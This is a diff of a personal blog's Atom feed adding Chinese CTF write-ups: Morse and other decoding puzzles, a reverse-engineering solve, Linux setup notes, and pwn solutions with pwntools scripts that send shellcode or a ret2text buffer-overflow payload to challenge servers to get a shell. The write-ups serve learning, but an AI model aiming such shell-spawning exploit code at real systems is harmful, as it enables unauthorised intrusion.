@@ -6,7 +6,7 @@
   <link href="https://rhea006.github.io/atom.xml" rel="self"/>
   
   <link href="https://rhea006.github.io/"/>
-  <updated>2025-06-15T11:19:26.391Z</updated>
+  <updated>2025-06-15T12:07:49.885Z</updated>
   <id>https://rhea006.github.io/</id>
   
   <author>
@@ -17,18 +17,296 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>摩斯电码</title>
+    <link href="https://rhea006.github.io/2025/06/828dca5ddec2.html"/>
+    <id>https://rhea006.github.io/2025/06/828dca5ddec2.html</id>
+    <published>2025-06-15T08:17:05.484Z</published>
+    <updated>2025-06-15T12:07:49.885Z</updated>
+    
+    <content type="html"><![CDATA[<p>…. . .-.. .-.. — ..–.- -.-. .-. -.– .–. - —<br>hello_crypto<br>TZCFlag{HELLO_CRYPTO}</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;…. . .-.. .-.. — ..–.- -.-. .-. -.– .–. - —&lt;br&gt;hello_crypto&lt;br&gt;TZCFlag{HELLO_CRYPTO}&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="Crypto" scheme="https://rhea006.github.io/categories/Crypto/"/>
+    
+    <category term="常见编码" scheme="https://rhea006.github.io/categories/Crypto/%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81/"/>
+    
+    <category term="莫尔斯电码(Morse Code)" scheme="https://rhea006.github.io/categories/Crypto/%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81/%E8%8E%AB%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81-Morse-Code/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>摩丝</title>
+    <link href="https://rhea006.github.io/2025/06/21db97fd724d.html"/>
+    <id>https://rhea006.github.io/2025/06/21db97fd724d.html</id>
+    <published>2025-06-15T08:17:05.481Z</published>
+    <updated>2025-06-15T12:07:37.828Z</updated>
+    
+    <content type="html"><![CDATA[<p>.. .-.. — …- . -.– — ..-<br>iloveyou</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;.. .-.. — …- . -.– — ..-&lt;br&gt;iloveyou&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="Crypto" scheme="https://rhea006.github.io/categories/Crypto/"/>
+    
+    <category term="常见编码" scheme="https://rhea006.github.io/categories/Crypto/%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81/"/>
+    
+    <category term="莫尔斯电码(Morse Code)" scheme="https://rhea006.github.io/categories/Crypto/%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81/%E8%8E%AB%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81-Morse-Code/"/>
+    
+    
+  </entry>
+  
+  <entry>
     <title></title>
-    <link href="https://rhea006.github.io/2025/06/3ebf44883f8a.html"/>
-    <id>https://rhea006.github.io/2025/06/3ebf44883f8a.html</id>
-    <published>2025-06-15T08:18:40.079Z</published>
-    <updated>2025-06-15T11:19:26.391Z</updated>
+    <link href="https://rhea006.github.io/2025/06/358bdb20a0d3.html"/>
+    <id>https://rhea006.github.io/2025/06/358bdb20a0d3.html</id>
+    <published>2025-06-15T08:17:05.445Z</published>
+    <updated>2025-06-15T10:09:00.203Z</updated>
     
-    <content type="html"><![CDATA[<p>sudo -i #root用户<br> ls -l &#x2F;etc&#x2F;netplan<br>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250601205045.png)<br>sudo chmod 600 &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml  #修改文件权限<br>sudo nano &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml  #更新配置文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: NetworkManager</span><br><span class="line">  ethernets:</span><br><span class="line">    ens33:</span><br><span class="line">      addresses: [192.168.142.132/24]         # 设置静态IP地址和掩码</span><br><span class="line">      routes:</span><br><span class="line">        - to: default</span><br><span class="line">          via: 192.168.142.2</span><br><span class="line">      nameservers:</span><br><span class="line">        addresses: [114.114.114.114,8.8.8.8]  # 设置主、备DNS</span><br><span class="line">      dhcp4: false                            # 禁用dhcp</span><br></pre></td></tr></table></figure><p>sudo netplan apply  #应用更改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#验证配置</span><br><span class="line">ip a show ens33</span><br><span class="line">ping -c 4 8.8.8.8   </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#确保SSH服务正常运行</span><br><span class="line">sudo apt install openssh-server</span><br><span class="line">sudo systemctl start ssh</span><br><span class="line">sudo systemctl enable ssh</span><br></pre></td></tr></table></figure><p>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250601213334.png)</p><h4 id="使用-SSH-密钥登录（最安全）"><a href="#使用-SSH-密钥登录（最安全）" class="headerlink" title="使用 SSH 密钥登录（最安全）"></a><strong>使用 SSH 密钥登录（最安全）</strong></h4><ol><li>在物理机生成密钥对：<br> ssh-keygen  # 默认保存到 ~&#x2F;.ssh&#x2F;id_rsa&#x3D;&#x3D;(空密码)&#x3D;&#x3D;<br>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250601214315.png)）</li><li>将公钥复制到虚拟机：<br> scp C:\Users\Rhea.ssh\id_rsa.pub <a href="mailto:&#114;&#104;&#x65;&#97;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x31;&#52;&#50;&#46;&#x31;&#51;&#50;">rhea@192.168.142.132</a>:~&#x2F;<br>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250601214846.png)）</li><li>直接免密登录：<br>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250601221831.png)）</li></ol>]]></content>
+    
+    
+    
+    <category term="Crypto" scheme="https://rhea006.github.io/categories/Crypto/"/>
+    
+    <category term="不知道分哪类" scheme="https://rhea006.github.io/categories/Crypto/%E4%B8%8D%E7%9F%A5%E9%81%93%E5%88%86%E5%93%AA%E7%B1%BB/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>password</title>
+    <link href="https://rhea006.github.io/2025/06/fbf475443deb.html"/>
+    <id>https://rhea006.github.io/2025/06/fbf475443deb.html</id>
+    <published>2025-06-15T08:17:05.444Z</published>
+    <updated>2025-06-15T12:07:11.505Z</updated>
+    
+    <content type="html"><![CDATA[<p>姓名：张三<br>生日：19900315<br>key格式为key{xxxxxxxxxx}</p><p>发现如果将张三变为 zs加上它的日期长度刚好符合题目的xx长度，那我们不妨试下：<br>flag{zs19900315}</p>]]></content>
     
     
       
       
-    <summary type="html">&lt;p&gt;sudo -i #root用户&lt;br&gt; ls -l &amp;#x2F;etc&amp;#x2F;netplan&lt;br&gt;![](&amp;#x2F;assets&amp;#x2F;images&amp;#x2F;Pasted image 20250601205045.png)&lt;br&gt;sudo chmod 600 </summary>
+    <summary type="html">&lt;p&gt;姓名：张三&lt;br&gt;生日：19900315&lt;br&gt;key格式为key{xxxxxxxxxx}&lt;/p&gt;
+&lt;p&gt;发现如果将张三变为 zs加上它的日期长度刚好符合题目的xx长度，那我们不妨试下：&lt;br&gt;flag{zs19900315}&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="Crypto" scheme="https://rhea006.github.io/categories/Crypto/"/>
+    
+    <category term="不知道分哪类" scheme="https://rhea006.github.io/categories/Crypto/%E4%B8%8D%E7%9F%A5%E9%81%93%E5%88%86%E5%93%AA%E7%B1%BB/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>dancemen</title>
+    <link href="https://rhea006.github.io/2025/06/cbb71a3305da.html"/>
+    <id>https://rhea006.github.io/2025/06/cbb71a3305da.html</id>
+    <published>2025-06-15T08:17:05.443Z</published>
+    <updated>2025-06-15T12:07:21.571Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/assets/images/dancemen.jpg"><br><img src="/assets/images/Pastedimage20250603124314.png"><br>TZCFlag{dancemenareinteresting}</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;/assets/images/dancemen.jpg&quot;&gt;&lt;br&gt;&lt;img src=&quot;/assets/images/Pastedimage20250603124314.png&quot;&gt;&lt;br&gt;TZCFlag{dancemenareinteresting}&lt;/p</summary>
+      
+    
+    
+    
+    <category term="Crypto" scheme="https://rhea006.github.io/categories/Crypto/"/>
+    
+    <category term="不知道分哪类" scheme="https://rhea006.github.io/categories/Crypto/%E4%B8%8D%E7%9F%A5%E9%81%93%E5%88%86%E5%93%AA%E7%B1%BB/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Rabbit 1</title>
+    <link href="https://rhea006.github.io/2025/06/bf8f92268b07.html"/>
+    <id>https://rhea006.github.io/2025/06/bf8f92268b07.html</id>
+    <published>2025-06-15T08:17:05.434Z</published>
+    <updated>2025-06-15T12:32:17.464Z</updated>
+    
+    <content type="html"><![CDATA[<p>U2FsdGVkX1&#x2F;+ydnDPowGbjjJXhZxm2MP2AgI<br><img src="/assets/images/%7B8C5ED5D3-48AE-4A5B-94BF-527E062586AC%7D.png"><br><a href="https://www.sojson.com/encrypt_rabbit.html">https://www.sojson.com/encrypt_rabbit.html</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;U2FsdGVkX1&amp;#x2F;+ydnDPowGbjjJXhZxm2MP2AgI&lt;br&gt;&lt;img src=&quot;/assets/images/%7B8C5ED5D3-48AE-4A5B-94BF-527E062586AC%7D.png&quot;&gt;&lt;br&gt;&lt;a href=&quot;https:</summary>
+      
+    
+    
+    
+    <category term="Crypto" scheme="https://rhea006.github.io/categories/Crypto/"/>
+    
+    <category term="Rabbit" scheme="https://rhea006.github.io/categories/Crypto/Rabbit/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>shellcode</title>
+    <link href="https://rhea006.github.io/2025/06/63e0052f564e.html"/>
+    <id>https://rhea006.github.io/2025/06/63e0052f564e.html</id>
+    <published>2025-06-14T14:00:00.000Z</published>
+    <updated>2025-06-15T12:38:10.585Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/assets/images/%7BD963E729-82E8-4920-BCC6-3E43CDB31255%7D1.png"><br>检查安全机制发现 <strong>NX (No-Execute) 已启用</strong>，这意味着栈内存不可执行，因此无法直接执行栈上的 shellcode。但题目中有一个明显的 <strong>后门函数</strong>，这应该才是解题的关键。<br><img src="/assets/images/Pastedimage20250605220423.png"><br><img src="/assets/images/Pastedimage20250605220507.png"><br>也没有开啥保护。<br>logo明显提示用shellcode,所以我们需要发送sellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;10.190.131.17&quot;</span>,<span class="number">62534</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/assets/images/%7B17DD8EEB-247B-4BB2-8BA3-995677E38184%7D1.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;/assets/images/%7BD963E729-82E8-4920-BCC6-3E43CDB31255%7D1.png&quot;&gt;&lt;br&gt;检查安全机制发现 &lt;strong&gt;NX (No-Execute) 已启用&lt;/strong&gt;，这意味着栈内存不可执行，因</summary>
+      
+    
+    
+    
+    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>整数溢出</title>
+    <link href="https://rhea006.github.io/2025/06/1f04604b780a.html"/>
+    <id>https://rhea006.github.io/2025/06/1f04604b780a.html</id>
+    <published>2025-06-14T14:00:00.000Z</published>
+    <updated>2025-06-15T12:26:08.911Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/assets/images/%7B82DBD94C-4B71-4F33-8BD4-3EECD2675F78%7D.png"><br><img src="/assets/images/Pastedimage20250605212046.png"><br><img src="/assets/images/Pastedimage20250605212223.png"><br>这里的<strong>0 ~ 0x7fffffff</strong>就是 <strong>0~2147483647</strong> ，<br><strong>0x80000000 ~ 0xffffffff</strong>就是 <strong>-2147483648 ~ -1</strong><br><img src="/assets/images/Pastedimage20250605212238.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接服务器（根据题目提示修改端口）</span></span><br><span class="line">p = remote(<span class="string">&#x27;10.190.131.17&#x27;</span>, <span class="number">61862</span>)  <span class="comment"># 示例端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待提示</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Enter an unsigned integer: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送目标数字</span></span><br><span class="line">p.sendline(<span class="string">b&quot;4294967295&quot;</span>)  <span class="comment"># 或 b&quot;-1&quot; 在某些环境下也可</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收flag</span></span><br><span class="line"><span class="built_in">print</span>(p.recvall().decode())</span><br></pre></td></tr></table></figure><p>这道题涉及整数溢出漏洞利用，目标是通过输入特定数字触发<code>gift()</code>函数获取flag。以下是完整的解题步骤：</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol><li><strong>关键代码</strong>：<br> printf(“Enter an unsigned integer: “);<br> _isoc99_scanf(“%u”, &amp;v4);  &#x2F;&#x2F; 读取无符号整数<br> if (v4 &#x3D;&#x3D; -1)  &#x2F;&#x2F; -1在无符号中等于4294967295<br> gift();    &#x2F;&#x2F; 触发flag输出</li><li><strong>整数溢出原理</strong>：<ul><li><code>v4</code>是<code>unsigned int</code>类型（4字节）</li><li><code>-1</code>在内存中被解释为无符号整数的最大值：<code>0xFFFFFFFF</code>（4294967295）    </li><li>输入<code>4294967295</code>可使条件<code>v4 == -1</code>成立</li></ul></li><li><strong>防护机制</strong>：<br> Full RELRO | Canary | NX | PIE<br> 虽然防护较强，但无需绕过这些保护，因为利用不涉及栈溢出</li></ol><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><ol><li><strong>计算目标值</strong>：<br> 4294967295 &#x3D; 2³² - 1 &#x3D; 0xFFFFFFFF</li><li><strong>触发gift函数</strong>：<ul><li>当输入<code>4294967295</code>时：<br>  v4 &#x3D; 4294967295 &#x3D; 0xFFFFFFFF<br>  v4 &#x3D;&#x3D; -1 → True  &#x2F;&#x2F; 因为-1在无符号中就是0xFFFFFFFF</li><li>执行<code>system(&quot;cat /ctfshow_flag&quot;)</code><br><img src="/assets/images/%7B91C4D1E4-DA5C-45B1-A1AE-72BD35872AC2%7D.png"></li></ul></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;/assets/images/%7B82DBD94C-4B71-4F33-8BD4-3EECD2675F78%7D.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;/assets/images/Pastedimage20250605212046.png&quot;&gt;&lt;br&gt;</summary>
+      
+    
+    
+    
+    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>ret2text</title>
+    <link href="https://rhea006.github.io/2025/06/6eb5ab8aa336.html"/>
+    <id>https://rhea006.github.io/2025/06/6eb5ab8aa336.html</id>
+    <published>2025-06-14T14:00:00.000Z</published>
+    <updated>2025-06-15T12:37:58.066Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/assets/images/%7B53C70E9A-8E89-4C8B-95E3-7078BD55343B%7D1.png"><br>32位<br>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250605135457.png)<br>Tab键<br>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250605135812.png)<br>nc一下<br><img src="/assets/images/%7BEAFBEA4F-0F51-421C-AD17-A89910A6224D%7D.png"><br>看pwnme函数<br>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250605140015.png)<br>这里有个fgets函数<br>Tab键<br>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250605140201.png)<br><strong>&#x3D;&#x3D;可以看到第一行s这个变量是在距离栈底ebp9个字节的地方&#x3D;&#x3D;</strong><br><img src="/assets/images/%7B463C8EE2-1263-43AF-B876-7B0C4F4B928F%7D.png"><br>题目叫stack，所以看了一下stack函数<br>![](&#x2F;assets&#x2F;images&#x2F;Pasted image 20250605140449.png)<br>妥妥的getshell函数<br>这段代码 system(“&#x2F;bin&#x2F;sh”) 的作用是在 Linux 系统中执行 &#x2F;bin&#x2F;sh 命令，它会打开一个新的 shell 进程。<br>具体来说，&#x2F;bin&#x2F;sh 是指向系统中的默认 shell 解释器的路径。通过执行该命令，你将进入一个新的交互式 shell 环境，可以在其中执行各种命令和操作。这对于开发者或者在某些情况下需要与系统进行交互的用户来说非常有用。</p><p>main点一下绿色<br><img src="/assets/images/Pastedimage20250605141027.png"><br>可以看到该函数地址为0x0804850F<br><img src="/assets/images/%7B3BBE1FF3-C061-4222-B03E-C2B1AB35901F%7D.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28308</span>)    <span class="comment">#远程连接</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0804850F</span>)   <span class="comment">#用a字符填满前面9个字节的空白，然后再用4字节填满原来的ebp(这里为汇编基础，因为程序位32位程序）</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)                    <span class="comment">#然后p32将stack函数写入地址的四个字节</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/assets/images/%7B3D19A85A-20C8-444E-A235-C906BCB99447%7D.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p =remote(<span class="string">&quot;pwn.chall.ctf.show&quot;</span>,<span class="number">28006</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x9</span>+<span class="number">4</span>) + p32(<span class="number">0x0804850F</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;/assets/images/%7B53C70E9A-8E89-4C8B-95E3-7078BD55343B%7D1.png&quot;&gt;&lt;br&gt;32位&lt;br&gt;![](&amp;#x2F;assets&amp;#x2F;images&amp;#x2F;Pasted image 20250</summary>
+      
+    
+    
+    
+    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>ELF</title>
+    <link href="https://rhea006.github.io/2025/06/232c7fc0fbd9.html"/>
+    <id>https://rhea006.github.io/2025/06/232c7fc0fbd9.html</id>
+    <published>2025-06-14T14:00:00.000Z</published>
+    <updated>2025-06-15T12:29:14.845Z</updated>
+    
+    <content type="html"><![CDATA[<p>linux也能逆？</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;linux也能逆？&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="REVERSE" scheme="https://rhea006.github.io/categories/REVERSE/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>tea</title>
+    <link href="https://rhea006.github.io/2025/06/e1972a9f50a5.html"/>
+    <id>https://rhea006.github.io/2025/06/e1972a9f50a5.html</id>
+    <published>2025-06-14T14:00:00.000Z</published>
+    <updated>2025-06-15T12:29:07.596Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/assets/images/Pastedimage20250606185429.png"><br><img src="/assets/images/Pastedimage20250606185436.png"><br><img src="/assets/images/Pastedimage20250606185452.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;/assets/images/Pastedimage20250606185429.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;/assets/images/Pastedimage20250606185436.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;/assets</summary>
+      
+    
+    
+    
+    <category term="REVERSE" scheme="https://rhea006.github.io/categories/REVERSE/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>简单的加密</title>
+    <link href="https://rhea006.github.io/2025/06/596e40547bb0.html"/>
+    <id>https://rhea006.github.io/2025/06/596e40547bb0.html</id>
+    <published>2025-06-14T14:00:00.000Z</published>
+    <updated>2025-06-15T12:28:42.557Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/assets/images/Pastedimage20250604161939.png"><br>shift+F12+Fn<br><img src="/assets/images/Pastedimage20250604162108.png"><br>点击<br><img src="/assets/images/Pastedimage20250604162142.png"><br>点击紫色的<br><img src="/assets/images/Pastedimage20250604162209.png"><br>Tab键<br><img src="/assets/images/%7B25FB6DF9-3CCD-4E0E-8CCD-6A7C5D792114%7D.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main_0(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // [esp+D0h] [ebp-114h]  </span><br><span class="line">  char Str1[260]; // [esp+DCh] [ebp-108h] BYREF</span><br><span class="line">  </span><br><span class="line">  #提示用户输入 flag</span><br><span class="line">  sub_456502(&quot;Hi CTFer,Input your flag:&quot;);</span><br><span class="line">  sub_4554EF(&quot;%s&quot;, Str1);</span><br><span class="line">  </span><br><span class="line">  for ( i = 0; i &lt; j__strlen(Str1); ++i )</span><br><span class="line">    ++Str1[i]; #将每个字符的 ASCII 值加 1</span><br><span class="line">  if ( !j__strcmp(Str1, &quot;gmbh|ZPV`GJOE`JU`IBIB~&quot;) )</span><br><span class="line">    sub_456502(&quot;you are right!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    sub_456502(&quot;you are wrong!\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对目标字符串 gmbh{ZPV<code>GJOE</code>JU<code>IBIB~&#125; 进行反向操作（每个字符减 1），得到原始输入的 flag：  每个字符减 1 后：</code>flag{YOU_FIND_IT_HAHA}&#96;</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;/assets/images/Pastedimage20250604161939.png&quot;&gt;&lt;br&gt;shift+F12+Fn&lt;br&gt;&lt;img src=&quot;/assets/images/Pastedimage20250604162108.png&quot;&gt;&lt;br&gt;点</summary>
+      
+    
+    
+    
+    <category term="REVERSE" scheme="https://rhea006.github.io/categories/REVERSE/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>apt源</title>
+    <link href="https://rhea006.github.io/2025/06/53e892fa4bab.html"/>
+    <id>https://rhea006.github.io/2025/06/53e892fa4bab.html</id>
+    <published>2025-06-14T14:00:00.000Z</published>
+    <updated>2025-06-15T12:30:29.448Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Types: deb</span><br><span class="line">URIs: http://mirrors.ustc.edu.cn/ubuntu/</span><br><span class="line">Suites: noble noble-updates noble-security</span><br><span class="line">Components: main restricted universe multiverse</span><br><span class="line">Signed-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span c</summary>
       
     
     
@@ -39,11 +317,33 @@
   </entry>
   
   <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/8fef3bd1f07c.html"/>
-    <id>https://rhea006.github.io/2025/06/8fef3bd1f07c.html</id>
-    <published>2025-06-15T08:18:40.078Z</published>
-    <updated>2025-06-15T10:09:00.203Z</updated>
+    <title>配置静态ip</title>
+    <link href="https://rhea006.github.io/2025/06/2ac849227b33.html"/>
+    <id>https://rhea006.github.io/2025/06/2ac849227b33.html</id>
+    <published>2025-06-14T14:00:00.000Z</published>
+    <updated>2025-06-15T12:30:19.820Z</updated>
+    
+    <content type="html"><![CDATA[<p>sudo -i #root用户<br> ls -l &#x2F;etc&#x2F;netplan<br><img src="/assets/images/Pastedimage20250601205045.png"><br>sudo chmod 600 &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml  #修改文件权限<br>sudo nano &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml  #更新配置文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: NetworkManager</span><br><span class="line">  ethernets:</span><br><span class="line">    ens33:</span><br><span class="line">      addresses: [192.168.142.132/24]         # 设置静态IP地址和掩码</span><br><span class="line">      routes:</span><br><span class="line">        - to: default</span><br><span class="line">          via: 192.168.142.2</span><br><span class="line">      nameservers:</span><br><span class="line">        addresses: [114.114.114.114,8.8.8.8]  # 设置主、备DNS</span><br><span class="line">      dhcp4: false                            # 禁用dhcp</span><br></pre></td></tr></table></figure><p>sudo netplan apply  #应用更改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#验证配置</span><br><span class="line">ip a show ens33</span><br><span class="line">ping -c 4 8.8.8.8   </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#确保SSH服务正常运行</span><br><span class="line">sudo apt install openssh-server</span><br><span class="line">sudo systemctl start ssh</span><br><span class="line">sudo systemctl enable ssh</span><br></pre></td></tr></table></figure><p><img src="/assets/images/Pastedimage20250601213334.png"></p><h4 id="使用-SSH-密钥登录（最安全）"><a href="#使用-SSH-密钥登录（最安全）" class="headerlink" title="使用 SSH 密钥登录（最安全）"></a><strong>使用 SSH 密钥登录（最安全）</strong></h4><ol><li>在物理机生成密钥对：<br> ssh-keygen  # 默认保存到 ~&#x2F;.ssh&#x2F;id_rsa&#x3D;&#x3D;(空密码)&#x3D;&#x3D;<br><img src="/assets/images/Pastedimage20250601214315.png">）</li><li>将公钥复制到虚拟机：<br> scp C:\Users\Rhea.ssh\id_rsa.pub <a 